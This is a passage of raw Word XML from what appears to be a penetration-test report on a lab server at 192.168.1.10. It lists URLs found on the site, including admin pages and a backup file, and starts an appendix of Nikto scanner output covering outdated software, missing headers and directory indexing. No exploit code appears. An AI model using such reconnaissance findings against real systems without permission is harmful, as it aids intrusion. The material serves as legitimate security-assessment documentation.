        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="532C4082" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E5AC92C" wp14:editId="1BE44D3E">
            <wp:extent cx="5943600" cy="20129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012950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B39284" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2073F61A" wp14:editId="1BB50E3A">
            <wp:extent cx="5943600" cy="19996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999615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B08C33E" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>Newly URLs found:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3713F1" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61"/>
    <w:p w14:paraId="4E04C61D" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://http://192.168.1.10/terms.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28311DE7" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/header.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F54F8D0" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/home.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DA31DB" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/cgi-bin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B786C9" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/audio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BA99F9" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/footer.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B1ADD7" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/icons/small/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6566D66A" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/preview.php</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="353C7B06" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/config.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4858D6" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/extras.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E850AC5" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/vb/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FAF950" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/vb/sqlcm.bak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773B526B" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/process.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D5C357" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/cookie.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B3ACCE" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/header2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF9509F" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/fonts/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96D249" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/error/include/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270DEB00" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/error/include/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFD267B" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/instructions.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BA2177" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/username.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A29179" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/billing.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB38E1F" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/font/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726019D2" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/session.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCB6FF8" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/phpmyadmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76935F79" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/hidden.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC291D5" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/shout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59614902" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/slider.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043AA726" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/phpinfo.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592B12FA" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61"/>
    <w:p w14:paraId="6483E72C" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/order.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33486178" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/add_warehouse.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD0144D" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/add_product.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA7DAC4" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/add_category.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1180505F" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/admin/Backup.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029804B6" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/OrderReports.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF97670" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/Employee.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294162A2" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/EmployeeReport.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C71B752" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/CustomerReport.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41928FCB" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/ProductReport.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA331C5" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/customerTable.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B90FEF" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/PaymentDelete.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A51498" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="006A5C61">
      <w:r>
        <w:t>http://192.168.1.10/admin/searchprod.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43140414" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRDefault="006A5C61" w:rsidP="008831CC">
      <w:r>
        <w:t>http://192.168.1.10/admin/shout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71ED4C94" w14:textId="77777777" w:rsidR="006A5C61" w:rsidRPr="0030505C" w:rsidRDefault="006A5C61" w:rsidP="008831CC"/>
    <w:p w14:paraId="379FB763" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="-5"/>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="_Toc531104379"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008831CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008831CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="054B20EB"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xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> v2.1.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3A8395"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D6A50D"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Target IP:          192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6686A6DB"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Target Hostname:    192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BC162B"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Target Port:        80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AB5E12"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Start Time:         2018-11-08 09:36:59 (GMT-5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314481FA"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3B1875"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Server: Apache/2.4.3 (Unix) OpenSSL/1.0.1c PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722602AA"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xml:space="preserve">+ Cookie PHPSESSID created without the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>httponly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37411C82"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Retrieved x-powered-by header: PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EF7EAB"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The anti-clickjacking X-Frame-Options header is not present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DB3EFD"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The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0C33B9"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The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E290271"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xml:space="preserve">+ Server leaks </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>inodes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>ETags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, header found with file /robots.txt, fields: 0x2a 0x57820c91d9900 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364F98C5"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OSVDB-3268: /company-accounts/: Directory indexing found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A490D0"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Entry '/company-accounts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12544DD6"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"robots.txt" contains 1 entry which should be manually viewed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473ACF27"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PHP/5.4.7 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3629DECA"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lastRenderedPageBreak/>
        <w:t>+ Apache/2.4.3 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F54BA21"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OpenSSL/1.0.1c appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70758084"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xml:space="preserve">+ Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>mod_negotiation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> is enabled with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>MultiViews</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
